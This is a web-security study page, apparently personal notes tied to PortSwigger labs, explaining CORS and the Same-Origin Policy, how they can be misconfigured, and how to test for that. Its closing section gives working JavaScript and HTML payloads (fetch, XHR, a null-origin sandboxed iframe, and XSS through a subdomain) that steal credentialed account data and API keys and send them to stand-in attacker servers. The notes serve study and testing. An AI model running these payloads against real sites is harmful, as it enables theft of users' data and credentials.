---
layout: default
title: "CORS and SOP"
parent: "Web Application"
nav_order: 6
---

# CORS and Same-Origin Policy (SOP)

## Definitions

**Same-Origin Policy (SOP)** restricts how a webpage can interact with resources from a different origin. Origin is defined by protocol + domain + port. All three must match.

- A script on `http://test.com` cannot access resources from `https://test.com` (different protocol)
- SOP is the default security posture — CORS exists to allow controlled exceptions to it

**Cross-Origin Resource Sharing (CORS)** is a protocol that allows servers to indicate which origins are permitted to access their resources. It relaxes SOP with explicit server-side permissions via HTTP headers.

Key point: **The server does not block requests based on CORS** — it processes the request and includes CORS headers in the response. The **browser** enforces the policy by granting or denying JavaScript access to the response.

---

## CORS Headers

| Header | Purpose |
|--------|---------|
| `Access-Control-Allow-Origin` | Which domains can access resources (single origin, list, or `*`) |
| `Access-Control-Allow-Methods` | Allowed HTTP methods |
| `Access-Control-Allow-Headers` | Allowed custom headers |
| `Access-Control-Max-Age` | How long preflight results can be cached |
| `Access-Control-Allow-Credentials` | Whether browser exposes response when credentials (cookies, auth) are sent |

Important: When `Access-Control-Allow-Credentials: true`, `Access-Control-Allow-Origin` **cannot** be `*` — it must be an explicit origin.

---

## Request Types

### Simple Requests
Treated similarly to same-origin requests. A request is "simple" if:
- Uses GET, HEAD, or POST
- POST Content-Type is `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain`
- No custom headers beyond CORS-safe headers

Cookies and auth data are included if the site has previously set credentials, even without `Access-Control-Allow-Credentials: true`.

### Preflight Requests
Triggered when the request does NOT qualify as simple. Browser sends an OPTIONS request first:
- Includes `Access-Control-Request-Method` and `Access-Control-Request-Headers`
- Server must respond with appropriate CORS headers
- If preflight passes, browser sends the actual request with credentials if `Access-Control-Allow-Credentials: true`

---

## Testing for CORS Misconfigurations

1. Add/modify the `Origin:` header to an arbitrary value — check if it's reflected in `Access-Control-Allow-Origin`
2. Set `Origin: null` — check if the server responds with `Access-Control-Allow-Origin: null`
3. Check the response:
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
```

### Common Misconfigurations
- Reflects any Origin value (trust all origins)
- Trusts origin with similar name: `hackersnormal-website.com`, `normal-website.com.evil-user.net`
- Trusts `null` origin
- Trusts an origin that uses HTTP instead of HTTPS
- Trusts a subdomain that is vulnerable to XSS

**Most CORS attacks require:**
```
Access-Control-Allow-Credentials: true
```
Without it, the browser won't send cookies, and the attacker only gets unauthenticated content.

---

## Exploitation Payloads

### Basic CORS Data Exfiltration
```javascript
// Working fetch-based approach
fetch('https://TARGET.web-security-academy.net/accountDetails', {
  method: 'GET',
  credentials: 'include',
  headers: {
    'Origin': 'https://EXPLOIT-SERVER.exploit-server.net/'
  }
})
  .then(response => response.json())
  .then(data => {
    const apiKey = data.apikey;
    fetch(`https://EXPLOIT-SERVER.exploit-server.net/log?apiKey=${apiKey}`);
  });
```

### XHR-Based Exfiltration
```javascript
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get', 'https://vulnerable-website.com/sensitive-victim-data', true);
req.withCredentials = true;
req.send();

function reqListener() {
    location='//malicious-website.com/log?key=' + this.responseText;
};
```

### Null Origin (via sandboxed iframe)
When server trusts `null` origin, use a sandboxed iframe to generate null origin requests:
```html
<iframe style="display: none;" sandbox="allow-scripts" srcdoc="
<script>
var req = new XMLHttpRequest();
var url = 'https://TARGET.web-security-academy.net';
req.onreadystatechange = function() {
    if (req.readyState == XMLHttpRequest.DONE){
        fetch('https://EXPLOIT-SERVER/log?key=' + req.responseText);
    }
};
req.open('GET', url + '/accountDetails', true);
req.withCredentials = true;
req.send(null);
</script>"></iframe>
```

### CORS via Trusted Subdomain with XSS
If a trusted subdomain is vulnerable to XSS, use it to make the CORS request:
```javascript
document.location = "http://subdomain.vulnerable-website.com/?param=<script>var req = new XMLHttpRequest();var url = 'https://vulnerable-website.com';req.onreadystatechange = function(){if (req.readyState == XMLHttpRequest.DONE){fetch('https://ATTACKER/log?key=' + req.responseText);}};req.open('GET', url + '/accountDetails', true);req.withCredentials = true;req.send(null);</script>"
```

---

## Further Reading
- https://medium.com/@mahakjaiswani888/navigating-cors-exploring-with-portswigger-labs-c13b37310cf3
